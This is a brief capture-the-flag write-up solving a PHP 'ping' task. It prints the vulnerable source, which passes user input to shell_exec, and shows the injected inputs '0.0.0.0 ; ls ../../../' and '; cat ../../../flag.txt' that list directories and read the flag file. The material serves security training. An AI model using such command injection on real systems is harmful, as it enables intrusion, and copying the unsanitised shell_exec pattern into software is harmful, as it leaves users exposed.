Source code of task:
<pre>
<?php
ini_set('error_displays', 0);
$ip = htmlspecialchars($_GET['url'], ENT_QUOTES);

$f = fsockopen($ip, 80, $errno, $errstr, 5);
if($f) {
	$result = shell_exec('ping -c 4 ' . $ip);
	echo '<div class="alert alert-success">' . nl2br($result) . '</div>';
} else {
	echo '<div class="alert alert-danger">' .$errstr . '</div>';
}
?>
</pre>
The only thing we need here is
<pre>
$result = shell_exec('ping -c 4 ' . $ip);
</pre>
This code excecutes in a bash console. So if you type 0.0.0.0 and press 'Ping' it will return a data.<br>
Now check for a flag file in directories:
<pre>
0.0.0.0 ; ls ../../../ =
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

0.0.0.0; cat ../../../flag.txt
</pre>
GL
